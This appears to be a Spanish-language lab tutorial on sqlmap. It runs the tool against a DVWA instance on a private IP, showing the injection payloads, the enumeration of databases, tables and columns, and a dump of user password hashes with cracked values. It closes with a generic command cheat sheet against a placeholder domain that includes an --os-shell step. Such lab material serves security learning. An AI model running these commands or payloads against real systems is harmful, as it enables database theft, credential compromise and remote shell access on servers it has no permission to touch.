# TOOLS SQL INJECTION
## SQL-MAP
Es una herramienta de prueba de penetración de código abierto que automatiza la detección y explotación de vulnerabilidades de inyección SQL en aplicaciones web. La herramienta es compatible con múltiples sistemas de gestión de bases de datos, incluidos MySQL, Oracle, PostgreSQL y Microsoft SQL Server, y utiliza técnicas avanzadas de prueba de inyección SQL para determinar si una aplicación web es vulnerable a ataques de inyección SQL y, de ser así, automatizar la explotación de la vulnerabilidad. SQLMap también puede utilizarse para recuperar información valiosa de bases de datos, como tablas, columnas, credenciales y datos confidenciales almacenados.
#### Ejecución

```java                                                         
┌──(s3cur1ty3c㉿kali)-[~/Escritorio]
└─$ sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low"___
       __H__                                                                                                                                                                                
 ___ ___[)]_____ ___ ___  {1.6.12#stable}                                                                                                                                                   
|_ -| . [,]     | .'| . |                                                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                              
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's
responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:37:45 /2023-02-15/
[14:37:45] [WARNING] provided value for parameter 'id' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:37:45] [INFO] resuming back-end DBMS 'mysql' 
[14:37:45] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=' OR NOT 8746=8746#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=' AND (SELECT 3829 FROM(SELECT COUNT(*),CONCAT(0x716b787671,(SELECT (ELT(3829=3829,1))),0x716a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FOjM&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=' AND (SELECT 9284 FROM (SELECT(SLEEP(5)))kwAX)-- qFqJ&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=' UNION ALL SELECT NULL,CONCAT(0x716b787671,0x636a636242684369556d51536741684458506b75686570496c6566764d44727a537a4d6a6d784b50,0x716a6a6b71)#&Submit=Submit
---
[14:37:45] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.2.14, PHP 5.3.1
back-end DBMS: MySQL >= 5.0
[14:37:45] [INFO] fetched data logged to text files under '/home/s3cur1ty3c/.local/share/sqlmap/output/192.168.200.152'
[*] ending @ 14:37:45 /2023-02-15/
```
La sentencia `sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low"` ejecuta el programa SQLMap para buscar y explotar vulnerabilidades de inyección SQL en la URL proporcionada.

Los parámetros de la sentencia son:

>* "-u": URL objetivo de la página web a analizar.
>* "--cookie": Cookies de sesión necesarias para acceder a la página.
>* "PHPSESSID": Identificador de sesión PHP en la cookie.
>* "security": Nivel de seguridad de la página web, en este caso, "low".

En resumen, esta sentencia ejecuta una prueba de inyección SQL en la página web `http://192.168.200.152/vulnerabilities/sqli/` utilizando las cookies de sesión indicadas.

### Enumeración DataBase
El parámetro `--dbs` es una de las opciones que se pueden proporcionar a SQLMap para indicar que se deben enumerar todas las bases de datos disponibles en el servidor subyacente. SQLMap luego intentará inyectar código SQL en el sitio web objetivo para extraer información sobre las bases de datos disponibles en el servidor.
``` java
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
┌──(s3cur1ty3c㉿kali)-[~/Escritorio]
└─$ sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low" --dbs
[15:09:39] [INFO] fetching database names
available databases [6]:
[*] cdcol
[*] dvwa
[*] information_schema
[*] mysql
[*] phpmyadmin
[*] test
[15:09:39] [INFO] fetched data logged to text files under '/home/s3cur1ty3c/.local/share/sqlmap/output/192.168.200.152'
[*] ending @ 15:09:39 /2023-02-15/
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
#### Enumeración de Tablas
El parámetro `--tables` en la sentencia de SQLMap indica que SQLMap debe enumerar todas las tablas disponibles en la base de datos especificada con el parámetro -D.
``` java
 sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low" --tables -D dvwa 
[15:17:33] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.2.14, PHP 5.3.1
back-end DBMS: MySQL >= 5.0
[15:17:33] [INFO] fetching tables for database: 'dvwa'
[15:17:33] [WARNING] reflective value(s) found and filtering out
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```
#### Enumeración de Columnas
El parámetro `--columns` en SQLMap se utiliza para enumerar las columnas (campos) de una tabla específica en una base de datos.
``` java
sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low" -D dvwa -T users --columns
[15:21:41] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.3.1, Apache 2.2.14
back-end DBMS: MySQL >= 5.0
[15:21:41] [INFO] fetching columns for table 'users' in database 'dvwa'
[15:21:41] [WARNING] reflective value(s) found and filtering out
Database: dvwa
Table: users
[6 columns]
+------------+-------------+
| Column     | Type        |
+------------+-------------+
| user       | varchar(15) |
| avatar     | varchar(70) |
| first_name | varchar(15) |
| last_name  | varchar(15) |
| password   | varchar(32) |
| user_id    | int(6)      |
+------------+-------------+
[15:21:41] [INFO] fetched data logged to text files under '/home/s3cur1ty3c/.local/share/sqlmap/output/192.168.200.152'
[*] ending @ 15:21:41 /2023-02-15/
```
#### Enumeración por consulta SQL-Query
En este caso, la opción `--sql-query` se utiliza para especificar una consulta SQL que selecciona los datos de las columnas específicas de la tabla "users". Los datos se muestran en la salida de la consola de SQLMap, en el formato predeterminado.
``` java
sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low" -D dvwa --sql-query "SELECT user, first_name, last_name, password FROM users"
[15:49:22] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.2.14, PHP 5.3.1
back-end DBMS: MySQL >= 5.0
[15:49:22] [INFO] fetching SQL SELECT statement query output: 'SELECT user, first_name, last_name, password FROM users'
[15:49:22] [WARNING] reflective value(s) found and filtering out
SELECT user, first_name, last_name, password FROM users [5]:
[*] admin, admin, admin, 5f4dcc3b5aa765d61d8327deb882cf99
[*] gordonb, Gordon, Brown, e99a18c428cb38d5f260853678922e03
[*] 1337, Hack, Me, 8d3533d75ae2c3966d7e0d4fcc69216b
[*] pablo, Pablo, Picasso, 0d107d09f5bbe40cade3de5c71e9e9b7
[*] smithy, Bob, Smith, 5f4dcc3b5aa765d61d8327deb882cf99
[15:49:22] [INFO] fetched data logged to text files under '/home/s3cur1ty3c/.local/share/sqlmap/output/192.168.200.152'
[*] ending @ 15:49:22 /2023-02-15/
```
#### Volcado o descarga de credenciales.
El parámetro `--dump` es utilizado en la herramienta de seguridad SQLMap para extraer los datos de las columnas de una tabla de una base de datos que ha sido comprometida con éxito por medio de una inyección de SQL.
Cuando SQLMap encuentra una vulnerabilidad de inyección de SQL en un sitio web o una aplicación web, intenta utilizar esa vulnerabilidad para obtener acceso a la base de datos subyacente. Una vez que ha obtenido acceso, se puede utilizar el parámetro --dump para extraer los datos de las columnas de una tabla en particular.
``` java                                                                 
┌──(s3cur1ty3c㉿kali)-[~/Escritorio]
└─$ sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low" -D dvwa -T users --columns -C "user, password" --dump                                                         
Database: dvwa
Table: users
[5 entries]
+---------+---------------------------------------------+
| user    | password                                    |
+---------+---------------------------------------------+
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------------------------------------------+
```

##

#List databases, add cookie values
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
  OR
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  


# List Tables, add databse name
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
  
# List Columns of that table
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
  
#Dump all values of the table
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
  

sqlmap -u "http:domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --os-shell